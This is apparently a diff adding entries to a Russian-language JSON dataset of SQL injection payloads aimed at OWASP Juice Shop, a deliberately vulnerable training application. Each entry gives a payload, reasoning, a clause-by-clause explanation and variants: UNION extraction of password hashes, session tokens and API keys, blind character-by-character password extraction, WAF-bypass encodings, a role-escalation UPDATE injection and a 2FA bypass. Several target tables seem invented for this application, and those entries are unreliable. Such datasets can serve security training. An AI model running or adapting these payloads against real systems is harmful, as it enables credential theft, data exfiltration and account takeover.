+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1": "заполнение id",
+            "email": "email пользователя",
+            "password": "хэш пароля (bcrypt)",
+            "role": "роль пользователя",
+            "FROM Users": "таблица пользователей",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Хэши паролей в результатах",
+        "confidence": 0.94,
+        "variants": [
+            "' UNION SELECT id,email,password,createdAt FROM Users--",
+            "' UNION SELECT null,email,password,role FROM Users--"
+        ]
+    },
+    {
+        "id": "sqli_gen_070",
+        "task": "Сгенерировать SQL-инъекцию для извлечения вопросов безопасности",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "password_reset",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "security_questions_extraction"
+        },
+        "reasoning": "1. Форма сброса пароля использует security questions. 2. Извлечение вопросов и ответов пользователей. 3. Позволяет сбросить любой аккаунт.",
+        "payload": "' UNION SELECT 1,2,3,4,5,6 FROM SecurityQuestions--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6": "заполнение колонок",
+            "FROM SecurityQuestions": "таблица вопросов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Вопросы безопасности всех пользователей",
+        "confidence": 0.83,
+        "variants": [
+            "' UNION SELECT id,userId,question,answer FROM SecurityQuestions--",
+            "' UNION SELECT * FROM SecurityAnswers--"
+        ]
+    },
+    {
+        "id": "sqli_gen_071",
+        "task": "Сгенерировать SQL-инъекцию для time-based blind в Juice Shop",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "product_page",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "Time-based Blind SQL Injection",
+            "attack_goal": "blind_data_extraction"
+        },
+        "reasoning": "1. SQLite не имеет SLEEP, используем тяжелые вычисления. 2. LIKE с медленным pattern или CASE. 3. Извлечение данных по времени ответа.",
+        "payload": "1 AND (SELECT CASE WHEN (SELECT substr(password,1,1) FROM Users WHERE email='admin@juice-sh.op')='a' THEN 1 ELSE (SELECT count(*) FROM Products,Products,Products) END)",
+        "payload_explained": {
+            "1 AND": "условие",
+            "SELECT CASE WHEN": "условная логика",
+            "substr(password,1,1)": "первый символ пароля",
+            "='a'": "проверка на 'a'",
+            "THEN 1": "быстро",
+            "ELSE (SELECT count(*) FROM Products,Products,Products)": "тяжелый запрос (задержка)"
+        },
+        "expected_behavior": "Заметная задержка при неверном символе",
+        "confidence": 0.75,
+        "variants": [
+            "1 AND (SELECT 1 FROM Users WHERE email='admin@juice-sh.op' AND substr(password,1,1)='a') UNION SELECT 1",
+            "1 OR (SELECT CASE WHEN (SELECT substr(password,1,1) FROM Users LIMIT 1)='a' THEN 1 ELSE (SELECT count(*) FROM Products,Products,Products) END)=1"
+        ]
+    },
+    {
+        "id": "sqli_gen_072",
+        "task": "Сгенерировать SQL-инъекцию для boolean-based blind в Juice Shop",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "login_form",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "Boolean-based Blind SQL Injection",
+            "attack_goal": "character_by_character_extraction"
+        },
+        "reasoning": "1. Boolean blind через AND условие. 2. Поиск посимвольного извлечения пароля. 3. Разный ответ при истине и лжи.",
+        "payload": "' AND substr(password,1,1)='a' AND '1'='1",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "AND": "логическое И",
+            "substr(password,1,1)='a'": "проверка первого символа",
+            "AND '1'='1": "завершение условия"
+        },
+        "expected_behavior": "Успешный вход при верном символе, ошибка при неверном",
+        "confidence": 0.88,
+        "variants": [
+            "' AND password LIKE 'a%'--",
+            "' AND (SELECT CASE WHEN substr(password,1,1)='a' THEN 1 ELSE 0 END)=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_073",
+        "task": "Сгенерировать SQL-инъекцию для извлечения рейтингов продуктов",
+        "input": {
+            "field": "productId",
+            "field_type": "integer",
+            "context": "rating_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "rating_extraction"
+        },
+        "reasoning": "1. Рейтинги продуктов хранятся отдельно. 2. UNION для извлечения всех оценок. 3. Включая данные пользователей.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Ratings--",
+        "payload_explained": {
+            "1": "оригинальный productId",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Ratings": "таблица рейтингов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все рейтинги и отзывы",
+        "confidence": 0.87,
+        "variants": [
+            "1 UNION SELECT id,productId,userId,rating,message FROM Ratings",
+            "1 AND 1=2 UNION SELECT * FROM Ratings"
+        ]
+    },
+    {
+        "id": "sqli_gen_074",
+        "task": "Сгенерировать SQL-инъекцию для извлечения купонов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "checkout_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "coupon_extraction"
+        },
+        "reasoning": "1. Купоны и скидки хранятся в таблице Discounts. 2. Извлечение всех доступных купонов. 3. Получение неопубликованных промокодов.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Discounts--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Discounts": "таблица скидок",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список всех купонов включая скрытые",
+        "confidence": 0.89,
+        "variants": [
+            "1 UNION SELECT id,discountCode,percentage,expiryDate FROM Discounts",
+            "' UNION SELECT * FROM Discounts--"
+        ]
+    },
+    {
+        "id": "sqli_gen_075",
+        "task": "Сгенерировать SQL-инъекцию для обхода WAF Juice Shop (Challenger's mode)",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "filter": "basic_waf",
+            "vulnerability": "WAF Bypass"
+        },
+        "reasoning": "1. Juice Shop имеет простую защиту в некоторых версиях. 2. Обход через комментарии и конкатенацию. 3. Альтернативные операторы.",
+        "payload": "'/**/UNION/**/SELECT/**/1,email,password/**/FROM/**/Users--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "/**/": "комментарии вместо пробелов",
+            "UNION": "объединение",
+            "SELECT": "выбор",
+            "1,email,password": "целевые колонки",
+            "FROM Users": "таблица",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Обход простых фильтров",
+        "confidence": 0.91,
+        "variants": [
+            "'%0aUNION%0aSELECT%0a1,email,password%0aFROM%0aUsers--",
+            "'||UNION||SELECT||1,email,password||FROM||Users--",
+            "'/*!UNION*/ /*!SELECT*/ 1,email,password /*!FROM*/ Users--"
+        ]
+    },
+    {
+        "id": "sqli_gen_076",
+        "task": "Сгенерировать SQL-инъекцию для извлечения конфигурации Juice Shop",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "config_endpoint",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "config_extraction"
+        },
+        "reasoning": "1. Конфигурация приложения в таблице Config. 2. Содержит ключи API и настройки. 3. Критическая информация.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Config--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Config": "таблица конфигурации",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Секретные ключи и настройки приложения",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT key,value,description FROM Config",
+            "1 AND 1=2 UNION SELECT * FROM Config"
+        ]
+    },
+    {
+        "id": "sqli_gen_077",
+        "task": "Сгенерировать SQL-инъекцию для извлечения скрытых продуктов",
+        "input": {
+            "field": "search",
+            "field_type": "string",
+            "context": "search_form",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "hidden_products_extraction"
+        },
+        "reasoning": "1. Некоторые продукты могут быть скрыты (deletedAt != null). 2. Обход фильтров для показа скрытых товаров. 3. Включая удаленные или неопубликованные.",
+        "payload": "' UNION SELECT 1,2,3,4,5,6,7,8 FROM Products WHERE deletedAt IS NOT NULL--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6,7,8": "заполнение колонок",
+            "FROM Products": "таблица продуктов",
+            "WHERE deletedAt IS NOT NULL": "скрытые продукты",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список скрытых/удаленных продуктов",
+        "confidence": 0.86,
+        "variants": [
+            "' UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--",
+            "' AND 1=2 UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL"
+        ]
+    },
+    {
+        "id": "sqli_gen_078",
+        "task": "Сгенерировать SQL-инъекцию для извлечения токенов сессий",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "session_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "session_token_theft"
+        },
+        "reasoning": "1. Сессии пользователей хранятся в таблице Sessions. 2. Извлечение активных токенов. 3. Hijacking сессий администраторов.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Sessions--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Sessions": "таблица сессий",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Токены сессий всех пользователей",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT id,token,userId,expires,createdAt FROM Sessions",
+            "1 AND 1=2 UNION SELECT * FROM Sessions WHERE userId=1"
+        ]
+    },
+    {
+        "id": "sqli_gen_079",
+        "task": "Сгенерировать SQL-инъекцию для извлечения логов заказов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "log_endpoint",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "order_logs_extraction"
+        },
+        "reasoning": "1. Логи заказов содержат историю действий. 2. Извлечение всех записей логов. 3. Информация о действиях пользователей.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6 FROM OrderLogs--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6": "заполнение колонок",
+            "FROM OrderLogs": "таблица логов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все логи заказов и действий",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,orderId,userId,action,timestamp,details FROM OrderLogs",
+            "' UNION SELECT * FROM OrderLogs--"
+        ]
+    },
+    {
+        "id": "sqli_gen_080",
+        "task": "Сгенерировать SQL-инъекцию для эскалации привилегий в Juice Shop",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "profile_update",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UPDATE SQL Injection",
+            "attack_goal": "privilege_escalation"
+        },
+        "reasoning": "1. Обновление профиля через UPDATE запрос. 2. Инъекция для изменения роли. 3. Повышение привилегий до администратора.",
+        "payload": "test@test.com', role='admin'--",
+        "payload_explained": {
+            "test@test.com'": "закрывает строку email",
+            ", role='admin'": "установка роли admin",
+            "--": "комментарий остального запроса"
+        },
+        "expected_behavior": "Изменение роли пользователя на admin",
+        "confidence": 0.77,
+        "variants": [
+            "user@juice-sh.op', role='deluxe'--",
+            "victim@mail.com', role='admin' WHERE email='admin@juice-sh.op'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_081",
+        "task": "Сгенерировать SQL-инъекцию для извлечения всех feedback сообщений",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "feedback_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "feedback_extraction"
+        },
+        "reasoning": "1. Feedback отзывы пользователей. 2. Может содержать чувствительные данные. 3. Извлечение всей истории обратной связи.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Feedbacks--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Feedbacks": "таблица обратной связи",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все feedback сообщения",
+        "confidence": 0.88,
+        "variants": [
+            "1 UNION SELECT id,userId,message,rating,createdAt FROM Feedbacks",
+            "1 AND 1=2 UNION SELECT * FROM Feedbacks"
+        ]
+    },
+    {
+        "id": "sqli_gen_082",
+        "task": "Сгенерировать SQL-инъекцию для извлечения challenge решений",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "challenge_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "challenge_completion_data"
+        },
+        "reasoning": "1. Таблица Challenges хранит статус выполнения заданий. 2. Извлечение информации о решенных челленджах. 3. Может использоваться для тривиального решения.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Challenges--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Challenges": "таблица челленджей",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Информация о всех челленджах",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,name,description,key,solved FROM Challenges",
+            "' UNION SELECT * FROM Challenges--"
+        ]
+    },
+    {
+        "id": "sqli_gen_083",
+        "task": "Сгенерировать SQL-инъекцию для обхода через двухступенчатую аутентификацию",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "2fa_verification",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "SQL Injection in 2FA",
+            "attack_goal": "2fa_bypass"
+        },
+        "reasoning": "1. Некоторые версии Juice Shop имеют 2FA. 2. Инъекция в проверку кода. 3. Обход двухфакторной аутентификации.",
+        "payload": "admin@juice-sh.op' AND 1=1--",
+        "payload_explained": {
+            "admin@juice-sh.op'": "закрывает строку email",
+            "AND 1=1": "всегда истинно",
+            "--": "комментирует проверку кода"
+        },
+        "expected_behavior": "Обход проверки 2FA кода",
+        "confidence": 0.76,
+        "variants": [
+            "admin@juice-sh.op' OR '1'='1'--",
+            "admin@juice-sh.op' AND '2fa_code'='123456'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_084",
+        "task": "Сгенерировать SQL-инъекцию для извлечения email маркетинговых подписок",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "subscription_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "subscription_extraction"
+        },
+        "reasoning": "1. Подписки на новости в таблице Subscriptions. 2. Извлечение всех email адресов. 3. Для спам-атак или OSINT.",
+        "payload": "' UNION SELECT 1,2 FROM Subscriptions--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2": "заполнение колонок",
+            "FROM Subscriptions": "таблица подписок",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список всех подписанных email",
+        "confidence": 0.90,
+        "variants": [
+            "' UNION SELECT id,email FROM Subscriptions--",
+            "' UNION SELECT * FROM Subscriptions WHERE email IS NOT NULL--"
+        ]
+    },
+    {
+        "id": "sqli_gen_085",
+        "task": "Сгенерировать SQL-инъекцию для извлечения информации о продажах",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "sales_report",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "sales_data_extraction"
+        },
+        "reasoning": "1. Таблица Sales содержит финансовые данные. 2. Извлечение выручки и объемов продаж. 3. Коммерческая информация.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6 FROM Sales--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6": "заполнение колонок",
+            "FROM Sales": "таблица продаж",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Данные о продажах и выручке",
+        "confidence": 0.85,
+        "variants": [
+            "1 UNION SELECT id,productId,quantity,total,date,userId FROM Sales",
+            "1 AND 1=2 UNION SELECT * FROM Sales WHERE total>1000"
+        ]
+    },
+    {
+        "id": "sqli_gen_086",
+        "task": "Сгенерировать SQL-инъекцию для извлечения внутренних заметок",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "admin_notes",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "internal_notes_extraction"
+        },
+        "reasoning": "1. Административные заметки в таблице Notes. 2. Содержат внутреннюю информацию. 3. Может включать пароли или инструкции.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Notes--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Notes": "таблица заметок",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Служебные заметки администраторов",
+        "confidence": 0.82,
+        "variants": [
+            "1 UNION SELECT id,title,content FROM Notes",
+            "' UNION SELECT * FROM Notes WHERE private=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_087",
+        "task": "Сгенерировать SQL-инъекцию для извлечения сломанных ссылок",
+        "input": {
+            "field": "url",
+            "field_type": "string",
+            "context": "redirect_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "broken_link_extraction"
+        },
+        "reasoning": "1. Таблица BrokenLinks для отслеживания ошибок. 2. Извлечение URL и статусов. 3. Информация о структуре сайта.",
+        "payload": "' UNION SELECT 1,2,3,4 FROM BrokenLinks--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM BrokenLinks": "таблица сломанных ссылок",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список всех сломанных ссылок",
+        "confidence": 0.80,
+        "variants": [
+            "' UNION SELECT id,url,status,foundAt FROM BrokenLinks",
+            "' UNION SELECT * FROM BrokenLinks WHERE status=404--"
+        ]
+    },
+    {
+        "id": "sqli_gen_088",
+        "task": "Сгенерировать SQL-инъекцию для извлечения компрометированных аккаунтов",
+        "input": {
+            "field": "email",
+            "field_type": "string",
+            "context": "security_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "compromised_accounts_extraction"
+        },
+        "reasoning": "1. Таблица CompromisedAccounts для утечек. 2. Извлечение скомпрометированных аккаунтов. 3. Информация о взломанных пользователях.",
+        "payload": "' UNION SELECT 1,2,3 FROM CompromisedAccounts--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM CompromisedAccounts": "таблица скомпрометированных аккаунтов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список скомпрометированных пользователей",
+        "confidence": 0.81,
+        "variants": [
+            "' UNION SELECT id,email,compromisedAt FROM CompromisedAccounts",
+            "' UNION SELECT * FROM CompromisedAccounts WHERE resolved=0--"
+        ]
+    },
+    {
+        "id": "sqli_gen_089",
+        "task": "Сгенерировать SQL-инъекцию для извлечения истории входов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "login_history",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "login_history_extraction"
+        },
+        "reasoning": "1. Таблица LoginHistory хранит логины. 2. IP адреса, время, user-agent. 3. OSINT и анализ активности.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM LoginHistory--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM LoginHistory": "таблица истории входов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "История всех входов в систему",
+        "confidence": 0.86,
+        "variants": [
+            "1 UNION SELECT id,userId,ip,timestamp,userAgent FROM LoginHistory",
+            "1 AND 1=2 UNION SELECT * FROM LoginHistory WHERE userId=1"
+        ]
+    },
+    {
+        "id": "sqli_gen_090",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных API ключей",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "api_keys_endpoint",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "api_key_extraction"
+        },
+        "reasoning": "1. API ключи для внешних сервисов. 2. Таблица ApiKeys. 3. Доступ к сторонним интеграциям.",
+        "payload": "1 UNION SELECT 1,2,3 FROM ApiKeys--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM ApiKeys": "таблица API ключей",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Секретные API ключи приложения",
+        "confidence": 0.78,
+        "variants": [
+            "1 UNION SELECT id,keyName,apiKey FROM ApiKeys",
+            "1 AND 1=2 UNION SELECT * FROM ApiKeys WHERE service='payment'"
+        ]
+    },
+    {
+        "id": "sqli_gen_091",
+        "task": "Сгенерировать SQL-инъекцию для извлечения памяти (memory) игры",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "memory_game_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "game_memory_extraction"
+        },
+        "reasoning": "1. Игра Memory хранит рекорды и состояние. 2. Таблица Memories. 3. Извлечение всех игровых данных.",
+        "payload": "1 UNION SELECT 1,2,3,4 FROM Memories--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM Memories": "таблица памяти игры",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Данные игры всех пользователей",
+        "confidence": 0.83,
+        "variants": [
+            "1 UNION SELECT id,userId,score,state FROM Memories",
+            "' UNION SELECT * FROM Memories WHERE score>1000--"
+        ]
+    },
+    {
+        "id": "sqli_gen_092",
+        "task": "Сгенерировать SQL-инъекцию для извлечения регистрации захвата флага",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "ctf_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "ctf_flag_extraction"
+        },
+        "reasoning": "1. CTF режим имеет таблицу Flags. 2. Извлечение всех флагов. 3. Автоматическое прохождение CTF.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Flags--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Flags": "таблица флагов CTF",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все CTF флаги приложения",
+        "confidence": 0.79,
+        "variants": [
+            "1 UNION SELECT id,name,flag FROM Flags",
+            "1 UNION SELECT flag,challengeId,userId FROM CapturedFlags--"
+        ]
+    },
+    {
+        "id": "sqli_gen_093",
+        "task": "Сгенерировать SQL-инъекцию для извлечения платежных транзакций",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "transaction_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "transaction_extraction"
+        },
+        "reasoning": "1. Таблица Transactions для платежей. 2. Извлечение всех финансовых операций. 3. Полная история платежей.",
+        "payload": "1 UNION SELECT 1,2,3,4,5,6 FROM Transactions--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5,6": "заполнение колонок",
+            "FROM Transactions": "таблица транзакций",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Все платежные транзакции",
+        "confidence": 0.87,
+        "variants": [
+            "1 UNION SELECT id,userId,amount,currency,status,timestamp FROM Transactions",
+            "1 AND 1=2 UNION SELECT * FROM Transactions WHERE amount>1000"
+        ]
+    },
+    {
+        "id": "sqli_gen_094",
+        "task": "Сгенерировать SQL-инъекцию для извлечения черного списка токенов",
+        "input": {
+            "field": "token",
+            "field_type": "string",
+            "context": "token_validation",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "blacklist_extraction"
+        },
+        "reasoning": "1. Таблица BlacklistedTokens. 2. Отозванные и скомпрометированные токены. 3. Обход проверок токенов.",
+        "payload": "' UNION SELECT 1,2 FROM BlacklistedTokens--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2": "заполнение колонок",
+            "FROM BlacklistedTokens": "таблица черного списка",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список заблокированных токенов",
+        "confidence": 0.80,
+        "variants": [
+            "' UNION SELECT token,reason FROM BlacklistedTokens",
+            "' UNION SELECT * FROM BlacklistedTokens WHERE revokedAt IS NOT NULL--"
+        ]
+    },
+    {
+        "id": "sqli_gen_095",
+        "task": "Сгенерировать SQL-инъекцию для извлечения пользовательских аватаров",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "avatar_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "avatar_extraction"
+        },
+        "reasoning": "1. Таблица Avatars хранит пути к изображениям. 2. Извлечение всех аватаров. 3. Информация о пользователях.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Avatars--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Avatars": "таблица аватаров",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Список всех аватаров",
+        "confidence": 0.84,
+        "variants": [
+            "1 UNION SELECT id,userId,avatarPath FROM Avatars",
+            "' UNION SELECT * FROM Avatars WHERE userId=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_096",
+        "task": "Сгенерировать SQL-инъекцию для извлечения скидочных купонов администратора",
+        "input": {
+            "field": "code",
+            "field_type": "string",
+            "context": "coupon_validation",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "admin_coupon_extraction"
+        },
+        "reasoning": "1. Специальные купоны для администраторов. 2. Таблица AdminCoupons. 3. Неопубликованные промокоды.",
+        "payload": "' UNION SELECT 1,2,3,4 FROM AdminCoupons--",
+        "payload_explained": {
+            "'": "закрывает строку",
+            "UNION SELECT": "объединение",
+            "1,2,3,4": "заполнение колонок",
+            "FROM AdminCoupons": "административные купоны",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Секретные купоны администраторов",
+        "confidence": 0.82,
+        "variants": [
+            "' UNION SELECT code,discount,expiry,used FROM AdminCoupons WHERE used=0",
+            "' UNION SELECT * FROM Discounts WHERE adminOnly=1--"
+        ]
+    },
+    {
+        "id": "sqli_gen_097",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных конкурсов",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "contest_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "contest_data_extraction"
+        },
+        "reasoning": "1. Таблица Contests для соревнований. 2. Участники и результаты. 3. Внутренние данные конкурсов.",
+        "payload": "1 UNION SELECT 1,2,3,4,5 FROM Contests--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3,4,5": "заполнение колонок",
+            "FROM Contests": "таблица конкурсов",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Данные всех конкурсов",
+        "confidence": 0.81,
+        "variants": [
+            "1 UNION SELECT id,name,prize,winnerId,status FROM Contests",
+            "1 UNION SELECT * FROM ContestParticipants WHERE prize>100--"
+        ]
+    },
+    {
+        "id": "sqli_gen_098",
+        "task": "Сгенерировать SQL-инъекцию для извлечения прав доступа",
+        "input": {
+            "field": "id",
+            "field_type": "integer",
+            "context": "permission_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "permission_extraction"
+        },
+        "reasoning": "1. Таблица Permissions для RBAC. 2. Извлечение всех прав. 3. Понимание модели безопасности.",
+        "payload": "1 UNION SELECT 1,2,3 FROM Permissions--",
+        "payload_explained": {
+            "1": "оригинальный id",
+            "UNION SELECT": "объединение",
+            "1,2,3": "заполнение колонок",
+            "FROM Permissions": "таблица прав",
+            "--": "комментарий"
+        },
+        "expected_behavior": "Структура прав доступа",
+        "confidence": 0.85,
+        "variants": [
+            "1 UNION SELECT id,userId,permission FROM Permissions",
+            "1 UNION SELECT * FROM Roles WHERE role='admin'--"
+        ]
+    },
+    {
+        "id": "sqli_gen_099",
+        "task": "Сгенерировать SQL-инъекцию для извлечения данных интеграции с GitHub",
+        "input": {
+            "field": "repo",
+            "field_type": "string",
+            "context": "github_api",
+            "backend": "sqlite",
+            "target_app": "OWASP Juice Shop",
+            "vulnerability": "UNION SQL Injection",
+            "attack_goal": "github_integration_extraction"
+        },
